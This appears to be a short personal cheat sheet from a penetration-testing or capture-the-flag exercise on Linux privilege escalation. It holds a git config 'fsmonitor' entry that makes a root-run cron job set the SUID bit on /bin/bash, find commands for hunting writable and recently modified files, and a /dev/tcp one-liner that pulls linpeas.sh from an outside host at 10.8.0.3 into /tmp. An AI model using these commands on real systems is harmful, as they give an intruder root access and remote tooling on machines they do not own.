- [ ] Git Config File
- [ ] Recents Modified Files
- [ ] Writable Locations

Git Config File!!!
```sh
# cronjob | this script is scheduled to run as root
/usr/local/bin/git-sync
->  git commit -m "Backup for ${day}"
# Permissions on the git config file
ls -la /home/dev01/.git/config
ls -la /home/dev01/.git/hooks
-> pre-commit.sample
# add a command that run whenever a commit is mad
e
[core]
fsmonitor = "chmod 4755 /bin/bash"
```
Recents Modified Files!!!
```sh
find / -newermt "2026-10-01" ! -newermt "2026-10-18" -ls | less -S
```
Writable Locations!!!
```sh
find / -user stuart 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'

find / -name *.sh -user opennms 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'

find / -group stuart 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'


exec 3<>/dev/tcp/10.8.0.3/80 && echo -e "GET /linpeas.sh HTTP/1.1\r\nHost: 10.8.0.3\r\nConnection: close\r\n\r\n" >&3 && cat <&3 > /tmp/linpeas.sh

```
![[Pasted image 20251118133852.png]]
